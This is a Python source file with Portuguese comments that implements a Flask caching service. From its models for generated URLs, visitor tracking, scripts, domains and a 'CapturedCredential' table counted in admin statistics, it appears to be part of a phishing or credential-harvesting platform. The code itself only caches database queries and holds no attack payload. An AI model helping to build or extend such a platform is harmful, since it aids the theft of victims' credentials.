from flask_caching import Cache
from datetime import datetime, timedelta
import json
import hashlib

class CacheService:
    """Serviço de cache para otimização de performance"""
    
    def __init__(self, app=None):
        self.cache = None
        if app:
            self.init_app(app)
    
    def init_app(self, app):
        """Inicializa o cache com a aplicação Flask"""
        # Configuração do cache
        app.config['CACHE_TYPE'] = 'SimpleCache'  # Cache em memória
        app.config['CACHE_DEFAULT_TIMEOUT'] = 300  # 5 minutos
        
        self.cache = Cache(app)
    
    def get(self, key):
        """Obtém um valor do cache"""
        if self.cache:
            return self.cache.get(key)
        return None
    
    def set(self, key, value, ex=None):
        """Define um valor no cache"""
        if self.cache:
            timeout = ex if ex else 300  # Default 5 minutos
            return self.cache.set(key, value, timeout=timeout)
        return False
    
    def delete(self, key):
        """Remove um valor do cache"""
        if self.cache:
            return self.cache.delete(key)
        return False
    
    def get_cache_key(self, prefix, *args, **kwargs):
        """Gera chave única para cache"""
        # Criar string única baseada nos argumentos
        key_data = f"{prefix}:{':'.join(map(str, args))}"
        if kwargs:
            key_data += f":{json.dumps(kwargs, sort_keys=True)}"
        
        # Hash para garantir tamanho consistente
        return hashlib.md5(key_data.encode()).hexdigest()
    
    def cache_dashboard_stats(self, user_id, days=7):
        """Cache para estatísticas do dashboard"""
        def get_dashboard_stats():
            from src.services.report_service import ReportService
            return ReportService.generate_user_performance_report(user_id, days)
        
        cache_key = self.get_cache_key('dashboard_stats', user_id, days)
        return self.cache.get_or_set(cache_key, get_dashboard_stats, timeout=300)  # 5 minutos
    
    def cache_user_urls(self, user_id, limit=50, offset=0):
        """Cache para URLs do usuário"""
        def get_user_urls():
            from src.models.user import GeneratedURL
            return GeneratedURL.query.filter_by(user_id=user_id)\
                .order_by(GeneratedURL.created_at.desc())\
                .offset(offset).limit(limit).all()
        
        cache_key = self.get_cache_key('user_urls', user_id, limit, offset)
        return self.cache.get_or_set(cache_key, get_user_urls, timeout=180)  # 3 minutos
    
    def cache_user_notifications(self, user_id, limit=20):
        """Cache para notificações do usuário"""
        def get_user_notifications():
            from src.models.user import Notification
            return Notification.query.filter_by(user_id=user_id)\
                .order_by(Notification.created_at.desc())\
                .limit(limit).all()
        
        cache_key = self.get_cache_key('user_notifications', user_id, limit)
        return self.cache.get_or_set(cache_key, get_user_notifications, timeout=60)  # 1 minuto
    
    def cache_script_list(self):
        """Cache para lista de scripts disponíveis"""
        def get_script_list():
            from src.models.user import Script
            return Script.query.filter_by(is_active=True).all()
        
        cache_key = self.get_cache_key('script_list')
        return self.cache.get_or_set(cache_key, get_script_list, timeout=1800)  # 30 minutos
    
    def cache_domain_list(self, user_id=None):
        """Cache para lista de domínios"""
        def get_domain_list():
            from src.models.user import Domain
            query = Domain.query.filter_by(is_active=True)
            if user_id:
                # Filtrar domínios disponíveis para o usuário
                query = query.filter_by(is_public=True)
            return query.all()
        
        cache_key = self.get_cache_key('domain_list', user_id or 'public')
        return self.cache.get_or_set(cache_key, get_domain_list, timeout=600)  # 10 minutos
    
    def cache_security_report(self, user_id, days=30):
        """Cache para relatório de segurança"""
        def get_security_report():
            from src.services.report_service import ReportService
            return ReportService.generate_security_report(user_id, days)
        
        cache_key = self.get_cache_key('security_report', user_id, days)
        return self.cache.get_or_set(cache_key, get_security_report, timeout=900)  # 15 minutos
    
    def cache_visitor_stats(self, url_id):
        """Cache para estatísticas de visitantes de uma URL"""
        def get_visitor_stats():
            from src.models.user import Visitor
            from sqlalchemy import func
            
            stats = {
                'total_visitors': Visitor.query.filter_by(generated_url_id=url_id).count(),
                'unique_visitors': Visitor.query.filter_by(generated_url_id=url_id)
                    .distinct(Visitor.ip_address).count(),
                'countries': {},
                'devices': {},
                'browsers': {}
            }
            
            # Estatísticas por país
            country_stats = Visitor.query.filter_by(generated_url_id=url_id)\
                .with_entities(Visitor.country, func.count(Visitor.id))\
                .group_by(Visitor.country).all()
            
            for country, count in country_stats:
                stats['countries'][country or 'Desconhecido'] = count
            
            # Estatísticas por dispositivo
            device_stats = Visitor.query.filter_by(generated_url_id=url_id)\
                .with_entities(Visitor.device_type, func.count(Visitor.id))\
                .group_by(Visitor.device_type).all()
            
            for device, count in device_stats:
                stats['devices'][device or 'Desconhecido'] = count
            
            # Estatísticas por navegador
            browser_stats = Visitor.query.filter_by(generated_url_id=url_id)\
                .with_entities(Visitor.browser, func.count(Visitor.id))\
                .group_by(Visitor.browser).all()
            
            for browser, count in browser_stats:
                stats['browsers'][browser or 'Desconhecido'] = count
            
            return stats
        
        cache_key = self.get_cache_key('visitor_stats', url_id)
        return self.cache.get_or_set(cache_key, get_visitor_stats, timeout=300)  # 5 minutos
    
    def cache_admin_stats(self):
        """Cache para estatísticas administrativas"""
        def get_admin_stats():
            from src.models.user import User, GeneratedURL, Visitor, CapturedCredential
            from sqlalchemy import func
            
            stats = {
                'total_users': User.query.count(),
                'active_users': User.query.filter_by(is_active=True).count(),
                'total_urls': GeneratedURL.query.count(),
                'active_urls': GeneratedURL.query.filter_by(is_active=True).count(),
                'total_visitors': Visitor.query.count(),
                'total_credentials': CapturedCredential.query.count(),
                'recent_activity': []
            }
            
            # Atividade recente (últimas 24 horas)
            yesterday = datetime.utcnow() - timedelta(days=1)
            
            stats['recent_activity'] = {
                'new_users': User.query.filter(User.created_at >= yesterday).count(),
                'new_urls': GeneratedURL.query.filter(GeneratedURL.created_at >= yesterday).count(),
                'new_visitors': Visitor.query.filter(Visitor.first_visit >= yesterday).count(),
                'new_credentials': CapturedCredential.query.filter(CapturedCredential.captured_at >= yesterday).count()
            }
            
            return stats
        
        cache_key = self.get_cache_key('admin_stats')
        return self.cache.get_or_set(cache_key, get_admin_stats, timeout=600)  # 10 minutos
    
    def invalidate_user_cache(self, user_id):
        """Invalida cache relacionado a um usuário específico"""
        patterns = [
            f'dashboard_stats:{user_id}:*',
            f'user_urls:{user_id}:*',
            f'user_notifications:{user_id}:*',
            f'security_report:{user_id}:*'
        ]
        
        for pattern in patterns:
            # Flask-Caching não suporta wildcard delete nativamente
            # Implementação simplificada - em produção usar Redis com SCAN
            pass
    
    def invalidate_url_cache(self, url_id):
        """Invalida cache relacionado a uma URL específica"""
        cache_key = self.get_cache_key('visitor_stats', url_id)
        self.cache.delete(cache_key)
    
    def invalidate_admin_cache(self):
        """Invalida cache administrativo"""
        cache_key = self.get_cache_key('admin_stats')
        self.cache.delete(cache_key)
    
    def invalidate_global_cache(self):
        """Invalida caches globais"""
        patterns = ['script_list', 'domain_list:*', 'admin_stats']
        for pattern in patterns:
            if ':' not in pattern:
                cache_key = self.get_cache_key(pattern)
                self.cache.delete(cache_key)
    
    def get_cache_info(self):
        """Obtém informações sobre o cache"""
        try:
            # Informações básicas do cache
            return {
                'type': 'SimpleCache',
                'status': 'active',
                'default_timeout': 300,
                'stats': {
                    'hits': getattr(self.cache.cache, '_hits', 0),
                    'misses': getattr(self.cache.cache, '_misses', 0),
                    'keys': len(getattr(self.cache.cache, '_cache', {}))
                }
            }
        except:
            return {
                'type': 'SimpleCache',
                'status': 'active',
                'default_timeout': 300,
                'stats': {
                    'hits': 0,
                    'misses': 0,
                    'keys': 0
                }
            }
    
    def clear_all_cache(self):
        """Limpa todo o cache"""
        try:
            self.cache.clear()
            return True
        except:
            return False
    
    def warm_up_cache(self, user_id):
        """Pré-carrega cache com dados frequentemente acessados"""
        try:
            # Carregar dados principais do usuário
            self.cache_dashboard_stats(user_id)
            self.cache_user_urls(user_id)
            self.cache_user_notifications(user_id)
            self.cache_script_list()
            self.cache_domain_list(user_id)
            
            return True
        except Exception as e:
            print(f"Erro ao aquecer cache: {e}")
            return False

# Instância global do cache
cache_service = CacheService()

